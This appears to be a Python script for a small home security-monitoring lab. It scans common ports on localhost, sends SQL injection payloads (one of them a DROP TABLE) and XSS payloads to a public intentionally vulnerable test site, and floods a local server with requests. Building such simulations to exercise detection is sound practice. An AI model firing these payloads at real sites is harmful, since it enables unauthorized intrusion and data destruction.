import socket
import requests
import time

print("=" * 50)
print("   Mini SOC - Attack Simulation Tool")
print("=" * 50)

# ─── 1. Port Scan Simulation ───────────────────────────
print("\n[1] Starting Port Scan Simulation...")
target = "127.0.0.1"
common_ports = [21, 22, 23, 80, 443, 3306, 8080, 8443, 9090, 3389]

for port in common_ports:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"    [OPEN]   Port {port} is open!")
        else:
            print(f"    [CLOSED] Port {port} is closed")
        sock.close()
    except:
        pass
    time.sleep(0.1)

print("[✓] Port Scan Complete!\n")
time.sleep(1)

# ─── 2. SQL Injection Simulation ──────────────────────
print("[2] Starting SQL Injection Simulation...")
target_url = "http://testphp.vulnweb.com"
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--",
    "' UNION SELECT * FROM users--"
]

for payload in sql_payloads:
    try:
        url = f"{target_url}/listproducts.php?cat={payload}"
        response = requests.get(url, timeout=5)
        if any(error in response.text.lower() for error in ["sql", "mysql", "error", "warning"]):
            print(f"    [VULNERABLE] Payload worked: {payload[:30]}...")
        else:
            print(f"    [BLOCKED]    Payload blocked: {payload[:30]}...")
    except:
        print(f"    [ERROR]      Could not reach target")
    time.sleep(0.5)

print("[✓] SQL Injection Test Complete!\n")
time.sleep(1)

# ─── 3. XSS Simulation ────────────────────────────────
print("[3] Starting XSS Simulation...")
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('hacked')"
]

for payload in xss_payloads:
    try:
        url = f"{target_url}/search.php?test={payload}"
        response = requests.get(url, timeout=5)
        if payload in response.text:
            print(f"    [VULNERABLE] XSS worked: {payload[:30]}...")
        else:
            print(f"    [BLOCKED]    XSS blocked: {payload[:30]}...")
    except:
        print(f"    [ERROR]      Could not reach target")
    time.sleep(0.5)

print("[✓] XSS Test Complete!\n")
time.sleep(1)

# ─── 4. DoS Simulation (light) ────────────────────────
print("[4] Starting DoS Simulation (light)...")
dos_target = "http://127.0.0.1:5000"

for i in range(20):
    try:
        requests.get(dos_target, timeout=2)
        print(f"    [REQUEST] Sent request #{i+1}")
    except:
        pass
    time.sleep(0.1)

print("[✓] DoS Simulation Complete!\n")

# ─── Done ──────────────────────────────────────────────
print("=" * 50)
print("   All Attack Simulations Complete!")
print("   Check your SOC Dashboard for alerts!")
print("=" * 50)